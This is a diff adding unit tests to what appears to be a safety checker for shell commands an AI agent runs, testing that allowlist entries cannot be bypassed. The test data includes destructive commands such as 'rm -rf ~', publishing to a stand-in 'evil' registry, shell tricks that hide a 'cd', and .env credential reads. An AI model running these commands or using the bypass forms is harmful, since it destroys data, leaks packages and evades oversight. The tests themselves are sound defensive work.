@@ -71,6 +71,85 @@ class TheWholeCommand(unittest.TestCase):
         self.assertFalse(hidden(entry, judged("cd $DIR && npm publish", MYLIB)))
         self.assertFalse(hidden(entry, judged("npm publish")))         # no cwd
 
+    def test_a_cd_the_shell_reads_but_its_first_word_does_not_show(self):
+        # A variable put before it, a keyword, a `!`, `time`, quotes inside
+        # the word, or CDPATH: bash still moves, so the folder is not known.
+        entry = "publish 'npm publish' in=~/work/mylib until=2027-01-31"
+        for command in ("X= cd /tmp/evil && npm publish",
+                        "CDPATH=/tmp cd evil && npm publish",
+                        "if true; then cd /tmp/evil; fi; npm publish",
+                        "! cd /tmp/evil; npm publish",
+                        "c''d /tmp/evil && npm publish",
+                        "time cd /tmp/evil && npm publish",
+                        "export CDPATH=/tmp; cd evil && npm publish",
+                        "case x in x) cd /tmp/evil;; esac; npm publish"):
+            with self.subTest(command=command):
+                self.assertFalse(hidden(entry, judged(command, MYLIB)))
+        # a plain cd below the folder, and an if that moves nowhere, still do
+        self.assertTrue(hidden(entry, judged("cd packages/a && npm publish", MYLIB)))
+        self.assertTrue(hidden(entry, judged("if true; then echo hi; fi; npm publish",
+                                             MYLIB)))
+
+    def test_a_second_command_of_the_same_rule_is_not_left_out_with_the_first(self):
+        # One hit a rule: an entry for the command it is about used to leave
+        # out the one after it as well.
+        cases = (
+            ("git.destructive 'git push --force origin gh-pages'",
+             "git push --force origin gh-pages && git push --force origin main"),
+            ("publish 'npm publish' in=~/work/mylib until=2027-01-31",
+             "npm publish && npm publish --registry https://registry.npmjs.evil.example/"),
+            ("publish 'npm publish' in=~/work/mylib until=2027-01-31",
+             "npm publish; cd /tmp/evil && npm publish"),
+            ("fs.destructive 'rm -rf ./build' in=~/work/mylib until=2027-01-31",
+             "rm -rf ./build && rm -rf ~"))
+        for entry, command in cases:
+            with self.subTest(command=command):
+                rec = judged(command, MYLIB)
+                self.assertFalse(hidden(entry, rec))
+                self.assertTrue(hidden(rec["id"], rec))        # its id still does
+                found, why = ignore.proposal(rec, TODAY)
+                self.assertIsNone(found)
+                self.assertIn("more than one command", why)
+        # one command is left out as before, and so is one that runs twice in
+        # a stage (it is one command to the shell's words)
+        one = judged("git push --force origin gh-pages", MYLIB)
+        self.assertTrue(hidden("git.destructive 'git push --force origin gh-pages'",
+                               one))
+
+    def test_many_repeats_cost_two_scans_not_one_each(self):
+        import time
+        started = time.time()
+        rec = judged("; ".join(["npm publish"] * 3000), MYLIB)
+        self.assertLess(time.time() - started, 5)
+        self.assertFalse(hidden("publish 'npm publish' in=~/work/mylib "
+                                "until=2027-01-31", rec))
+
+    def test_a_windows_path_is_not_written_into_an_entry(self):
+        # POSIX splitting drops the backslashes: C:\\data\\old\\cache would be
+        # written C:dataoldcache, and would leave out C:\\data\\oldcache too.
+        rec = {"cwd": "C:\\p", "hits": [{
+            "rule": "fs.destructive", "severity": "high", "_on": "command",
+            "_subject": "rm -rf C:\\data\\old\\cache", "_cd": ""}]}
+        found, why = ignore.proposal(rec, TODAY)
+        self.assertIsNone(found)
+        self.assertIn("Windows path", why)
+        other = dict(rec, hits=[dict(rec["hits"][0], _subject="rm -rf /data/old/cache")])
+        self.assertIsNotNone(ignore.proposal(other, TODAY)[0])
+
+    def test_match_path_is_what_an_entry_does(self):
+        # match_path is the reference; Entry.matches is what runs.
+        for pattern, path in ((MYLIB + "/.env.test", MYLIB + "/.env.test"),
+                              (MYLIB + "/*/.env", MYLIB + "/a/.env"),
+                              (MYLIB + "/*", MYLIB + "/sub/.env"),
+                              (MYLIB + "/.env", MYLIB + "/.env.test"),
+                              (MYLIB + "/.env*", MYLIB + "/.env.test")):
+            with self.subTest(pattern=pattern, path=path):
+                rec = judged(None, tool="Read", file_path=path)
+                entry, = ignoring("cred.read %s until=2027-04-01"
+                                  % pattern).parsed.entries
+                self.assertEqual(entry.matches(ignore._Facts(rec, rec["hits"][0]), TODAY),
+                                 ignore.match_path(pattern, path))
+
     def test_a_path_entry_matches_the_file_a_tool_read(self):
         read = judged(None, tool="Read", file_path=MYLIB + "/.env.test")
         self.assertEqual(read["hits"][0]["_on"], "path")
